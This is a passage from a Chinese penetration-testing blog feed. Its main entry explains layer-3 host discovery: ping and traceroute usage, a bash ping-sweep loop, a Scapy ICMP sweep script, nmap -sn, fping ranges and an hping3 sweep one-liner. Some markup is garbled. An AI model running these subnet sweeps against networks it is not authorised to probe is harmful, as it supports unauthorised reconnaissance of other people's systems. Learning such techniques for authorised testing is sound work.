class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;直接与目标系统交互通信&lt;/li&gt;
&lt;li&gt;无法避免留下访问的痕迹（如果目标系统有完善的系统日志）&lt;/li&gt;
&lt;li&gt;使用受控的
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全" scheme="https://www.lsowl.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="parrot" scheme="https://www.lsowl.xyz/tags/parrot/"/>
    
      <category term="信息收集" scheme="https://www.lsowl.xyz/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>主动信息收集——三层发现</title>
    <link href="https://www.lsowl.xyz/2018/06/05/%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md/"/>
    <id>https://www.lsowl.xyz/2018/06/05/基于TCP-IP的三层发现.md/</id>
    <published>2018-06-05T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.212Z</updated>
    
    <content type="html"><![CDATA[<ul><li>三层发现的优点<ul><li>可路由</li><li>速度快</li></ul></li><li>缺点<ul><li>速度比二层慢</li><li>经常被边界防火墙过滤(还有可能出现宕机状态）</li></ul></li><li>IP、ICMP、TCP协议</li></ul><ol><li><p>ping</p><ul><li><p>使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0</p></li><li><p>ping -192.168.0.102 -c 5         在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包</p></li><li><p>进行三层的发现除了进行icmp的探测之外还可以用路由追踪 <figure class="highlight plain"><figcaption><span>使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡</span><br><span class="line"></span><br><span class="line">- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来</span><br><span class="line"></span><br><span class="line">- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本：</span><br><span class="line"></span><br><span class="line">  ```bash</span><br><span class="line">  #/bin/bash</span><br><span class="line">  if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">      echo &quot;Usage - ./ping.sh [interface]&quot;</span><br><span class="line">      echo &quot;Example - ./ping.sh 192.168.1.0&quot;</span><br><span class="line">      echo &quot;Example will perform an ICMP&quot;</span><br><span class="line">  exit</span><br><span class="line">  fi</span><br><span class="line">      prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3)</span><br><span class="line">      for addr in $(seq 1 254); do</span><br><span class="line">      ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p></li><li><p>除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage - ./pingr 0/24 ICMP"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example - ./pingr 192.168.0.103"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example will perform an ICMP scan of the 192.168.0.0/24 range"</span>  </span><br><span class="line">sys.exit()</span><br><span class="line">address = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix = address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)     </span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:       </span><br><span class="line">        <span class="keyword">pass</span>   </span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了</li></ul><ol start="2"><li><p>除了使用ping和traceroute之外还可以使用nmap进行三层的发现：</p><ul><li><figure class="highlight plain"><figcaption><span>192.168.1.103 -sn```  nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. fping :比ping的命令强大一点</span><br><span class="line"></span><br><span class="line">   - ```fping 192.168.1.103 -c 10</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><figcaption><span>-g 192.168.1.1 192.168.1.103  -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   - ```fping -f iplist.txt``` 调用ip列表文件</span><br><span class="line"></span><br><span class="line">4. hping :</span><br><span class="line"></span><br><span class="line">   - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试</span><br><span class="line"></span><br><span class="line">   - 功能强大，但每次只能扫描一个目标</span><br><span class="line"></span><br><span class="line">   - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描</span><br><span class="line"></span><br><span class="line">   - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中</span><br><span class="line"></span><br><span class="line">      ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;三层发现的优点&lt;ul&gt;
&lt;li&gt;可路由&lt;/li&gt;
&lt;li&gt;速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点&lt;ul&gt;
&lt;li&gt;速度比二层慢&lt;/li&gt;
&lt;li&gt;经常被边界防火墙过滤(还有可能出现宕机状态）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IP、ICM
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全" scheme="https://www.lsowl.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="parrot" scheme="https://www.lsowl.xyz/tags/parrot/"/>
    
      <category term="信息收集" scheme="https://www.lsowl.xyz/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
